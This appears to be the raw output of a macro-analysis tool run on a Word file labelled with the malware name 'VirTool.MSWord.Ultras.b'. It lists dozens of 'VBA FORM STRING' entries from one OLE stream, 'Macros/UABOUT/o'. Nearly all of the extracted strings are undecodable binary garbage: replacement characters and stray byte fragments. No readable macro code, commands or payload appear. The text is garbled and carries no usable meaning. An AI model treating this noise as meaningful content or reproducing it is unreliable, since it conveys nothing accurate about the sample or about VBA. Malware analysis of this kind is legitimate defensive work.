- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
``o������@@L
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������;;>44799<>>ABBFFFJJJN���������������������SSXQQVOOSLLPHHLCCG������224++-##%������GGG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@[������pp�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�``п��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t``����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
O������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
k���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
˿��������������������QQSNNPKKLHHIEEE������ppv@@N@@U@@\@@b���������@@q@@n@@m@@k@@h@@g����������������  @
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 00H������������ppz@@I@@D@@ADDDGGGxxx�����������������偁�GGJ@@CEEH��������������������������������}}�zz}wwz������jjleeg__a������zzzFFF@@Cpp|������������00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ��������������@@�@@�@@�@@�@@�``쏏��������@@�@@�@@�������pp�@@�@@�PP����@@�@@�@@�@@�@@�``����������@@x@@t@@q@@n@@k@@j@@h@@h@@g���������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
FPP�������������@@�@@�@@�@@�@@�@@�ֿ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!#//1;;>���������jjqiixee`a�\]�������RT�PR�OQ����|}�RS�UV���������珏�UUZ;;>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  ����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
N@@m������������������  "((*//2���lln@@Dssv������zz}OOSPPTQQU\\a������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%%(446@@D���������kkqjjxff}bc�_`�������WX�UW�UV���倁�XY�[]�������}}�ZZ_BBF((*
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`@@z������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!#))+���hhk;;?pps������JJNLLQddiPPTPPU\\a���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������ppx			
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
))+77:EEH���������llsjjxgg|������������[\�Z[�Z[���ⅆ�__�bc�������]]bHHL003���11<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�忿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
럟����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!��ɉ��ffh������YY\EEHGGK���yy|MMQNNR���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������@@I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
88;::=HHL���������lluijxgg{������������_`�_`�_`�������eehiz������KKP77:  !���@@`
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���俿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������88;<<???C���ttvGGJHHL���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������  *
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bbc<<?JJN���������kkviiygg{������������cc�cd�dd���ߍ��jkvhho������lln]]_LLM���  _
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}��࿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������++-//2447���kkn==@??C���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
bbd==@KKOXX]������jjwhhzgg|������������ff}gg|hiz��݇��eejZZ_���������������00U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ֿ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
l��ܿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  "%%'���bbc003336���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}}~==@KKOXX]������jjwhhzgg|fg}fg|������iixkkvklshhn``fbbf���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Z��׿��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+���������������


-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���UUV!!"$$&���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���==@KKOWW\������jkwhiygg{gg|gg{������llujjpddj]]bTTYJJNVVZ������zzz
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J��ӿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���GGH
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���;;?IIMVVZ������kkuiixhhz������������jjpcch[[`���kko>>B225������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:��Ͽ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@@K
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



778���99=GGKSSX������llskkvijx������������eej\\aSSW���ooq447''*������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+��̿��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D���@@h
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������@@i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SSS���77:DDHPPU������jjplltkku������������``eVV[LLP���hhk**,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ڿ�쿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
$��ȿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PPп��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PPR���447AADLLP������ddjiiokkqllrkkq������ZZ_PPUEEI__b..0!!#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���߿��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�������������PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ɿ��������������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
